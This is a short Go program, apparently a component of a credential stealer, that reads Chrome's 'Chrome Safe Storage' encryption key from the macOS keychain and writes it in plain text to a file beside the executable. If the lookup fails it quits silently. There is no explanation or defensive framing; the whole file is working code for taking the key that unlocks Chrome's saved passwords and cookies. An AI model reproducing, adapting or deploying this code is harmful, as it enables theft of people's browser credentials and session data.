package main

import (
	"io/ioutil"
	"os"
	"path"
	"path/filepath"
	"strings"

	"github.com/keybase/go-keychain"
)

func main() {
	exePath, _ := os.Executable()
	exePath, _ = filepath.Abs(exePath)
	currPath := filepath.Dir(exePath)
	memoFile := path.Join(currPath, "secretTmpLog.txt")
	secret, err := keychain.GetGenericPassword("Chrome Safe Storage", "Chrome", "Chrome Safe Storage", "")
	if err != nil {
		return
	} else {
		ioutil.WriteFile(memoFile, []byte(strings.TrimSpace(string(secret))), os.ModePerm)
	}
}
